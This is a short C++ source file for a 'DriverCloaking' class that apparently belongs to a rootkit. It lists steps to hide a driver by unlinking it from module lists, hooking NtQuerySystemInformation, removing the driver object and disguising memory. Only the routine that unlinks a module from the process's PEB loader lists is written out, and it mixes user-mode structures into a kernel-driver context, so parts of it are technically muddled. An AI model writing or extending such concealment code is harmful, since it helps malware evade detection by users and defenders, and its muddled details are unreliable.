#include "DriverCloaking.h"

bool DriverCloaking::CloakDriver() {
    // Unlink from loaded module lists
    UnlinkFromPEB();
    
    // Hide from NtQuerySystemInformation
    HookSystemQuery();
    
    // Remove from kernel driver object list
    RemoveDriverObject();
    
    // Modify memory regions to appear as system memory
    DisguiseMemoryRegions();
    
    return true;
}

bool DriverCloaking::UnlinkFromPEB() {
    PPEB pPeb = NtCurrentTeb()->ProcessEnvironmentBlock;
    PLIST_ENTRY moduleList = &pPeb->Ldr->InLoadOrderModuleList;
    PLIST_ENTRY entry = moduleList->Flink;
    
    while (entry != moduleList) {
        PLDR_DATA_TABLE_ENTRY module = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (IsOurDriver(module)) {
            // Remove from all three lists
            RemoveEntryList(&module->InLoadOrderLinks);
            RemoveEntryList(&module->InMemoryOrderLinks);
            RemoveEntryList(&module->InInitializationOrderLinks);
            return true;
        }
        entry = entry->Flink;
    }
    return false;
} 